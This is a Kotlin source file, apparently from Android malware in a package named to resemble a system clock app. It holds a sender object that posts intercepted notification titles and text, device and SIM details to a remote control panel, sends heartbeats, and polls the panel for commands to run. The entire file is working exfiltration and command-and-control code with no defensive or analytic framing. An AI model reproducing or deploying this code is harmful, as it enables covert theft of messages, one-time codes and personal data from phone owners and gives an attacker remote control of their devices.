package com.android.declock

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.UUID

object WebPanelSender {
    private val client = OkHttpClient()
    private val scope = CoroutineScope(Dispatchers.IO)
    private const val PREFS = "sms_panel"

    private fun deviceId(context: Context): String = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).let { p ->
        p.getString("device_id", null) ?: UUID.randomUUID().toString().also { p.edit().putString("device_id", it).apply() }
    }

    fun send(context: Context, packageName: String, appLabel: String, title: String, text: String) {
        val base = BuildConfig.PANEL_API_URL.trimEnd('/'); val token = BuildConfig.PANEL_DEVICE_TOKEN
        if (base.isBlank() || token.isBlank()) { Log.w("WebPanelSender", "Panel API not configured"); return }
        val body = JSONObject().apply { put("deviceId", deviceId(context)); put("deviceLabel", DeviceInfo.deviceLabel()); put("android", DeviceInfo.androidVersion()); put("sims", DeviceInfo.formatSims(context)); put("packageName", packageName); put("appLabel", appLabel); put("title", title); put("text", text) }.toString()
        scope.launch { try { val request = Request.Builder().url("$base/api/device/event").header("x-device-token", token).post(body.toRequestBody("application/json".toMediaType())).build(); client.newCall(request).execute().use { r -> Log.d("WebPanelSender", "Event response=${r.code}") } } catch (e: Exception) { Log.e("WebPanelSender", "Failed to send event", e) } }
    }

    fun heartbeat(context: Context) {
        val base = BuildConfig.PANEL_API_URL.trimEnd('/'); val token = BuildConfig.PANEL_DEVICE_TOKEN
        if (base.isBlank() || token.isBlank()) return
        val body = JSONObject().apply { put("deviceId", deviceId(context)); put("deviceLabel", DeviceInfo.deviceLabel()); put("android", DeviceInfo.androidVersion()); put("sims", DeviceInfo.formatSims(context)) }.toString()
        scope.launch { try { val req = Request.Builder().url("$base/api/device/heartbeat").header("x-device-token", token).post(body.toRequestBody("application/json".toMediaType())).build(); client.newCall(req).execute().close() } catch (e: Exception) { Log.e("WebPanelSender", "Heartbeat failed", e) } }
    }

    fun poll(context: Context, onCommands: (List<JSONObject>) -> Unit) {
        val base = BuildConfig.PANEL_API_URL.trimEnd('/'); val token = BuildConfig.PANEL_DEVICE_TOKEN
        if (base.isBlank() || token.isBlank()) return
        val body = JSONObject().put("deviceId", deviceId(context)).toString()
        scope.launch {
            try {
                val req = Request.Builder().url("$base/api/device/poll").header("x-device-token", token).post(body.toRequestBody("application/json".toMediaType())).build()
                client.newCall(req).execute().use { r ->
                    if (!r.isSuccessful) return@use
                    val arr = r.body?.string()?.let { JSONObject(it).optJSONArray("commands") } ?: return@use
                    val out = mutableListOf<JSONObject>()
                    for (i in 0 until arr.length()) {
                        val value = arr.opt(i)
                        out += if (value is JSONObject) value else JSONObject(value.toString())
                    }
                    onCommands(out)
                }
            } catch (e: Exception) { Log.e("WebPanelSender", "Poll failed", e) }
        }
    }
}
